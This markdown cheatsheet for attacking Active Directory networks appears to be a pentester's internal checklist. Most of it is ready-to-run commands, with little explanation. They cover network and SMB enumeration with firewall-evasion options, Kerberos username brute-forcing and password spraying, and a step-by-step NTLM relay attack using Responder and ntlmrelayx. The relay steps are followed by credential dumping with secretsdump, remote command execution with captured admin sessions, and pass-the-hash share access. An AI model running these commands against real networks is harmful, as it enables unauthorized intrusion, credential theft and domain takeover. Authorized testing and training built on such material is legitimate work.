# AD-Internal-Checklist | Active Direcotry All Cheatsheets and resources. 

## Enumerate the network. 
Enumerating the network is a very important step to discover domain controllers, servers, printers, workstations. 

The first tsep is to do is to get the IP range you are connected to. `ifconfig` / `ipconfig`. Collect as much information as possible about an AD envirement.  The goal is to get valid credentials or atleast a list o valid usernames. 

without creds 

- Nmap: 

```bash
nmap -sP -p <ip>/range # ping scan
```

```bash
nmap -PN -sV -f --open -f <ip>/range # quick scan
```

```bash
nmap -PN -sC -sV -oA <output> <ip> # classic scan
```
Options to bypass firewall `-f / -sS / -PN`

- Crackmapexec (favorit)
 This will enumerate smb null session
 ```bash
 crackmapexec smb 10.10.10.1/24 -u '' -p ''
 ```
 
 This will enumerate anonymouss access to share. 

 ```bash
 crackmapexec smb <ip> -u 'a' -p '' --shares
 ```
- OSINT: you can use open source intelligence to get a list of valid usernames depending on various [active directory naming conventions](https://activedirectorypro.com/active-directory-user-naming-convention/)

- LDAP: `ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\*)'`
- LDAP: `nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>` 
- Enum4Linux: `enum4linux -U <dc-ip> | grep 'user:'`
- SMB: Enumerate anonymous and null session: 
```bash
smbclient -U '%' -L //<dc-ip> && smbclient -U 'guest%' -L //<dc-ip>
python3 smbmap.py --host-file smb-hosts.txt -d test.local -L
```
- SMB: `smbclient -L 172.16.1.0`. To gain access a share: `smbclient  \\\\172.16.1.0\\$share`
- Once you craft a list of possible usernames, you can perform nmap kerberoas bruteforce to get valid ones:  
```bash
kerbrute userenum -d test.local usernames.txt
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip> 
```
 * using crackmapexec: 
  ```bash
  crackmapexec smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
  ```
* Using Rebeus (Windows tool)
  ```bash
  Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt
  ```
* using [kerbrute](https://github.com/ropnop/kerbrute): 
  ```bash
  kerbrute passwordspray -d test.local domain_users.txt password123
  ```
TIP: Crackmapexec is prefered

## NTLM Relay attack 

1 - First, makesure you modify on responder file `/etc/responder/Responder.conf` as below:
```bash
SMB = Off  // Off instead of On
HTTP = Off  // Off instead of On
```
2 - Create a list of hosts within the environment with SMB signing disabled using crackmapexec

```bash
crackmapexec smb IP/RANGE --gen-relay-list targets.txt
wc -l targets.txt #check how many targets you've gathered. 
```
Fire up responeder to capture hashes

 ```bash
responder -I eth1 -d -w
```

3 - fire up `ntlmrelayx` script to relay the obtained hashes

 ```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -debug -socks
```

4 - Check ntlmrelayx if any session was captured.
```bash
ntlmrelayx> socks
Protocol  Target         Username         AdminStatus  Port 
--------  -------- 	 --------         --------     ------
SMB       192.168.1.9    DOM/alice_admin  TRUE         445
SMB       192.168.1.16   DOM/alice_admin  TRUE         445
SMB       192.168.1.17   DOM/alice_admin  TRUE         445
SMB       192.168.1.13   DOM/alice_admin  TRUE         445
SMB       192.168.1.31   DOM/alice_admin  TRUE         445
```
5 - Use proxychains to interact with ntlmrelayx socks fonctionality (1080 is the default port within ntlmrelayx)

```bash
nano /etc/proxychains.conf
[ProxyList]
socks4  127.0.0.1 1080
```

6 - You can basically do whatever you want to do with those sessions

  ```bash
proxychains impacket-smbclient -no-pass DOM/alice_admin@192.168.1.41
proxychains impacket-secretsdump DOM/alice_admin@192.168.1.4
impacket-secretsdump DOM/bob_admin@192.168.1.8
crackmapexec smb 192.168.1.10 -u dom_admin -p dom_admin_password -x whoami
```

## With credentials 

Use the credentials in you favor to enumerate usefull information or gain access to computers maybe get a Domain Admin.

- Get other users. `python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1`
- Get almost all information about an AD envirement:

 ```bash
 crackmapexec smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
 ```

## SMB SHARES

```bash
with credentials : smbclient -L 172.16.1.0  -U=user%password

with credentials access : smbclient \\\\172.16.1.0\\$share  -U=user%password

with ntlm access : smbclient \\\\172.16.1.0\\$share -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local

mount smb share : sudo mkdir /tmp/data; sudo mount -t cifs -o 'user=USER,password=PASSWORD' //10.0.2.80/shareapp /tmp/data
```

- Find computers you can login to. 
